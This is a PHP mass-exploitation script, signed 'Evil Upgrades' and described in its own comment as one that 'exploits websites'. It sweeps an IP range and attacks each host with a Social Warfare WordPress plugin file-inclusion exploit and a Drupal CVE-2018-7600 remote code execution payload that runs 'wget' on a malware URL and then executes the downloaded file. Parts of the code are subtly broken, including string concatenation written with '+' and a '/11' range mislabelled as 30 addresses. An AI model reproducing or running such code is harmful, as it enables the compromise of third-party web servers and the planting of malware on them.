<?php
//this script exploits websites
//written by Evil Upgrades

function getIpRange(  $cidr) {

    list($ip, $mask) = explode('/', $cidr);

    $maskBinStr =str_repeat("1", $mask ) . str_repeat("0", 32-$mask );      //net mask binary string
    $inverseMaskBinStr = str_repeat("0", $mask ) . str_repeat("1",  32-$mask ); //inverse mask

    $ipLong = ip2long( $ip );
    $ipMaskLong = bindec( $maskBinStr );
    $inverseIpMaskLong = bindec( $inverseMaskBinStr );
    $netWork = $ipLong & $ipMaskLong; 

    $start = $netWork+1;//ignore network ID(eg: 192.168.1.0)

    $end = ($netWork | $inverseIpMaskLong) -1 ; //ignore brocast IP(eg: 192.168.1.255)
    return array('firstIP' => $start, 'lastIP' => $end );
}

function getEachIpInRange ( $cidr) {
    $ips = array();
    $range = getIpRange($cidr);
    for ($ip = $range['firstIP']; $ip <= $range['lastIP']; $ip++) {
        $ips[] = long2ip($ip);
    }
    return $ips;
}

//social warfare plugin rfi
//loads malware from rfi script
function social_warfare($ip, $malware){
    $ch = curl_init();
    echo "trying social warfare on: " . $ip . PHP_EOL;
    $url = "http://" . $ip . "/wp-admin/admin-post.php?rce=id&swp_debug=load_options&swp_url=" . $malware;
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    $output = curl_exec($ch);
    if (!curl_errno($ch)) {
        switch ($http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE)) {
          case 200:  # OK
            echo "[+]social warfare exploited..." . PHP_EOL;
            return true;
            break;
          default:
            echo 'Unexpected HTTP code: ', $http_code, "\n";
            return false;
        }

      }
    curl_close($ch);
}

//vuln in drupal allows rce
//executes php script from malware server
function drupal_2018_7600($ip, $malware, $script_name) { 
    $ch = curl_init();
    echo "trying drupal_2018_7600 on: " . $ip . PHP_EOL;
    $url = "http://" . $ip;
    $url = $url + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax';
    curl_setopt($ch, CURLOPT_POSTFIELDS, array(
        'form_id' => 'user_register_form',
        '_drupal_ajax' => '1',
        'mail[#post_render][]' => 'exec',
        'mail[#type]' => 'markup',
        'mail[#markup]' =>  'wget ' . $malware . ' && ./' . $script_name,
    ));
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);

    $result = curl_exec($ch);

    if (!curl_errno($ch)) {
        switch ($http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE)) {
          case 200:  # OK
            echo "drupal exploited..." . PHP_EOL;
            return true;
            break;
          default:
            echo 'Unexpected HTTP code: ', $http_code, "\n";
            return false;
        }
      }

    curl_close($ch);
   
}


$cidr = '1.3.0.0/11'; // max. 30 ips
error_reporting(E_ERROR | E_PARSE);
foreach((getEachIpInRange ( $cidr)) as $ip){
    echo "targeting: ". $ip . PHP_EOL;
    if ( social_warfare($ip, "http://127.0.0.1:1337/exploit.php") != true) { 
      echo "social warfare exploit failed " . PHP_EOL;
    }

    if (drupal_2018_7600($ip, "http://127.0.0.1/exploit.php", "exploit.php") != true) { 
      echo "drupal exploit failed..." . PHP_EOL;
    }

}